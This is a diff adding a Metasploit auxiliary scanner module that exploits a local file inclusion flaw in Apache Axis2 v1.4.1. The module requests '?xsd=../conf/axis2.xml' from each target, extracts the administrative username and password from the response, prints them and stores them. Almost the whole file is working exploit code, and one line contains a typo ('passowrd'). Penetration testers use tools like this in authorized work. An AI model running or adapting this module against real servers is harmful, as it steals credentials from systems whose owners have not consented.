@@ -1,0 +1,121 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::HttpClient
+	include Msf::Auxiliary::Report
+	include Msf::Auxiliary::Scanner
+
+
+	def initialize
+		super(
+			'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
+			'Version'        => '$Revision$',
+			'Description'    => %q{ This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
+			   By loading a local XML file which contains a cleartext username and password, attackers can trivially
+			   recover authentication credentials to Axis services.},
+			'References'		 => 
+			[
+				['URL', 'http://www.exploit-db.com/exploits/12721/']
+			],
+			'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
+			'License'        =>  MSF_LICENSE
+		)
+
+		register_options(
+			[ Opt::RPORT(8080),
+				OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
+		], self.class)
+
+	end
+
+	def target_url
+		"http://#{vhost}:#{rport}#{datastore['URI']}"
+	end
+
+	def run_host(ip)
+		uri = datastore['URI']
+
+		begin
+			res = send_request_raw({
+				'method'  => 'GET',
+				'uri'     => "#{uri}",
+			}, 25)
+
+			if (res and res.code == 200)
+				extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
+				new_uri = "/axis2/services/#{$1}"
+
+				get_credentials(new_uri)
+
+			else
+				print_status("#{target_url} - Apache Axis - The remote page not acessible")	
+				return 
+
+			end
+
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+		rescue ::Timeout::Error, ::Errno::EPIPE
+
+		end	
+	end
+
+	def get_credentials(uri)
+		lfi_payload = "?xsd=../conf/axis2.xml"
+
+		begin
+			res = send_request_raw({
+				'method'  => 'GET',
+				'uri'     => "#{uri}" + lfi_payload,
+			}, 25)
+
+			print_status("#{target_url} - Apache Axis - Dumping administrative credentials")		
+
+			if (res and res.code == 200)
+				if res.body.to_s.match(/axisconfig/)
+
+					username = res.body.to_s.scan(/parameter\sname=\"userName\">([^\s]+)</)
+					password = res.body.to_s.scan(/parameter\sname=\"password\">([^\s]+)</)
+
+					print_good("#{target_url} - Apache Axis - Credentials Found Username: #{username} - Password: #{password}")
+
+					report_auth_info(
+						:host => rhost,
+						:proto => 'axis',
+						:user => username,
+						:pass => passowrd,
+						:target_host => rhost,
+						:target_port => rport,
+						:vhost  => vhost,
+						:critical => true
+					)
+
+				else
+					print_error("#{target_url} - Apache Axis - Not Vulnerable")			
+					return :abort
+				end
+
+			else
+				print_error("#{target_url} - Apache Axis - Unrecognized #{res.code} response")
+				return :abort
+
+			end
+
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+		rescue ::Timeout::Error, ::Errno::EPIPE
+		end
+	end
+end
